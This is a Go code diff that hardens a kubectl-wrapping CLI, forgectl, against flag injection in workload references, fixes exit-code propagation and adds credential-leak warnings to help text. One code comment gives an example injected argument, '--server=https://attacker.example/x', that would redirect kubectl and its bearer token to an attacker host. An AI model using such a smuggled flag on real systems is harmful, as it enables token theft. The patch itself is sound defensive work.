@@ -6,6 +6,8 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"os/exec"
+	"regexp"
 	"strings"
 
 	"github.com/spf13/cobra"
@@ -88,8 +90,11 @@ func newK8sNsCmd(runner forgexec.Runner) *cobra.Command {
 	}
 }
 
-// wrapK8sCommandError opts `ns` into kubectl's real exit code, mirroring the
-// logs command's handling in newK8sLogsCmd's RunE above.
+// wrapK8sCommandError opts every k8s subcommand into kubectl's real exit
+// code. Run and RunStreaming fail with a *forgexec.CommandError, handled by
+// the first branch. RunInteractive (exec's seam) returns cmd.Run()'s error
+// unwrapped — a bare *exec.ExitError — so the second branch unwraps that
+// directly rather than expecting a shape RunInteractive never produces.
 func wrapK8sCommandError(err error) error {
 	if err == nil {
 		return nil
@@ -98,7 +103,38 @@ func wrapK8sCommandError(err error) error {
 	if errors.As(err, &commandErr) && commandErr.ExitCode > 0 {
 		return WithExitCode(err, commandErr.ExitCode)
 	}
+	var exitErr *exec.ExitError
+	if errors.As(err, &exitErr) {
+		return WithExitCode(err, exitErr.ExitCode())
+	}
 	return err
+}
+
+// k8sWorkloadPattern is the charset kubectl itself accepts for a resource
+// kind or name (a DNS-1123-ish subdomain segment). It is the second half of
+// validateK8sWorkload's check — the first half (rejecting a leading '-'
+// before any parsing) is what actually closes the flag-injection path; this
+// pattern additionally keeps a validated name safe to interpolate into the
+// events field selector below (no comma, no '=').
+var k8sWorkloadPattern = regexp.MustCompile(`^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$`)
+
+// validateK8sWorkload parses and validates a "<kind>/<name>" workload
+// reference before any part of it reaches kubectl argv or the events field
+// selector. A check that only confirms "contains a slash, has a name" would
+// accept a value like "--server=https://attacker.example/x" — kubectl then
+// parses that as its own global flag, redirecting the call (and its bearer
+// token) to an attacker-chosen server. Rejecting a leading '-' outright, and
+// constraining both halves to kubectl's own charset, closes that off.
+func validateK8sWorkload(workload string) (name string, err error) {
+	invalid := fmt.Errorf("workload reference %s must be kind/name (e.g. deployment/api)", termsafe.QuoteText(workload))
+	if strings.HasPrefix(workload, "-") {
+		return "", invalid
+	}
+	kind, name, ok := strings.Cut(workload, "/")
+	if !ok || !k8sWorkloadPattern.MatchString(kind) || !k8sWorkloadPattern.MatchString(name) {
+		return "", invalid
+	}
+	return name, nil
 }
 
 // newK8sExecCmd wraps `kubectl exec` argv verbatim. Unlike logs, exec has no
@@ -119,7 +155,10 @@ severity filtering: kubectl owns the terminal for the duration of the call.
   forgectl k8s exec pod/api -c sidecar -- cat /etc/hostname
 
 There are no forgectl-owned flags to consume; every argument forwards to
-kubectl exec exactly as given.`,
+kubectl exec exactly as given, and every argument is operator-trusted:
+forgectl does not vet it, and a global kubectl flag carrying a credential
+(--token, a bearer URL) may surface in forgectl's error output or debug logs
+on failure. Prefer a kubeconfig context over passing credentials as flags.`,
 		// kubectl owns the entire flag vocabulary here, including flags that
 		// collide with Cobra's own (-c, -i, -t), so Cobra must not parse them.
 		DisableFlagParsing: true,
@@ -154,6 +193,10 @@ to that workload's name. The first argument must be a "<kind>/<name>"
 reference (e.g. deployment/api); any remaining arguments (namespace, context,
 ...) are forwarded to all three kubectl calls unchanged.
 
+Forwarded arguments are operator-trusted input, never externally-derived
+data — forgectl does not vet them, and a global kubectl flag carrying a
+credential may surface in forgectl's error output or debug logs on failure.
+
   forgectl k8s inspect deployment/api
   forgectl k8s inspect pod/api-7f6c9 -n prod`,
 		DisableFlagParsing: true,
@@ -167,9 +210,9 @@ reference (e.g. deployment/api); any remaining arguments (namespace, context,
 				return errors.New("kubectl inspect requires a kind/name workload reference")
 			}
 			workload := args[0]
-			_, name, ok := strings.Cut(workload, "/")
-			if !ok || name == "" {
-				return fmt.Errorf("workload reference %s must be kind/name (e.g. deployment/api)", termsafe.QuoteText(workload))
+			name, err := validateK8sWorkload(workload)
+			if err != nil {
+				return err
 			}
 			return runK8sInspectTriple(cmd.Context(), runner, cmd.OutOrStdout(), workload, name, args[1:])
 		},
